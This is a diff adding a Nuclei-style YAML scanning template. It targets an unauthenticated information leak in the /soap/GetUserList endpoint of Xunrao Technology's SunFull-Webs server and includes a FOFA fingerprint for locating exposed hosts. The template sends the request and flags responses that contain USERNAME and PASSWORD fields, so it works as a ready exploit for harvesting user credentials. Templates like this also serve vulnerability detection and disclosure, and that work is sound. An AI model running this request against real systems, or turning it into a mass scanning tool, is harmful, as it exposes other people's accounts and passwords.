@@ -1,0 +1,28 @@
+id: xunrao-tech-getuserlist-info-leak
+
+info:
+  name: "迅饶科技GetUserList接口存在敏感数据暴露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: server="SunFull-Webs"
+      迅饶科技GetUserList接口因权限校验机制缺失，攻击者可通过构造特定请求获取非授权用户数据
+  tags: 迅饶科技
+
+http:
+- raw:
+  - |
+    GET /soap/GetUserList HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'USERNAME'
+  - type: word
+    part: body
+    words:
+    - 'PASSWORD'
